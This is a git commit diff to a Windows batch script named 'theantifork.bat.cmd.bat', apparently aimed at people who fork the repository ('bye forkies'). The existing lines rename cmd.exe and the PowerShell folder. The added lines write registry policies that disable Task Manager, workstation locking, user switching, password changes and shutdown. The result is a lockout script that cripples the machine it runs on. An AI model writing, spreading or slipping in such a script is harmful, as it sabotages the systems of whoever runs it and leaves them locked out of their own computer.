0f5b62dbc8faa5d703ae4862c205efb5e82df36e
Niveproplus <aahatef0rkiess@outlook.com>
2025-12-14 16:54:29 -0600

    bye forkies
    Added commands to disable various user options and modify registry settings.

--- theantifork.bat.cmd.bat
+++ theantifork.bat.cmd.bat
@@ -7,6 +7,20 @@ ren cmd.exe test.exe
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
  /v DisableTaskMgr /t REG_DWORD /d 1 /f
 ren WindowsPowerShell Powershell
+@echo off
+echo Disabling Ctrl+Alt+Del options...
+
+:: Disable Task Manager
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
+ /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
+ /v DisableLockWorkstation /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
+ /v HideFastUserSwitching /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" ^
+ /v DisableChangePassword /t REG_DWORD /d 1 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" ^
+ /v NoClose /t REG_DWORD /d 1 /f
 echo no more forkies
 pause
 @echo on
